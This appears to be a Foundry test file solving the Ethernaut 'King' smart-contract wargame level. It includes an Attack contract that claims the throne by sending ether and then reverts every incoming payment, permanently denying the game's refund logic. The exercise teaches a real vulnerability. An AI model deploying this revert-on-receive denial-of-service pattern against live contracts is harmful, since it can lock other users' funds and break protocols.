pragma solidity ^0.8.10;

//import "ds-test/test.sol";
import "forge-std/Vm.sol";
import "forge-std/Test.sol";

import "../src/09-King/KingFactory.sol";
import "../src/Ethernaut.sol";

contract KingTest is Test {
    Ethernaut ethernaut;
    address eoaAddress = address(1337);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(eoaAddress, 1 ether);
    }

    function testKingHack() public {
        /////////////////
        // LEVEL SETUP //
        /////////////////

        KingFactory factory = new KingFactory();
        ethernaut.registerLevel(factory);
        vm.startPrank(eoaAddress);
        address levelAddress = ethernaut.createLevelInstance{value: 0.001 ether}(factory);
        // King level = King(payable(levelAddress));

        //////////////////
        // LEVEL ATTACK //
        //////////////////

        Attack attack = new Attack(); 
        attack.attack{value: 0.1 ether}(levelAddress);

        //////////////////////
        // LEVEL SUBMISSION //
        //////////////////////

        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}

contract Attack {

    function attack(address target) public payable {
        (bool success, ) = payable(target).call{value: msg.value}("");
        console.log(success);
    }

    receive() external payable {
        revert();
    }
}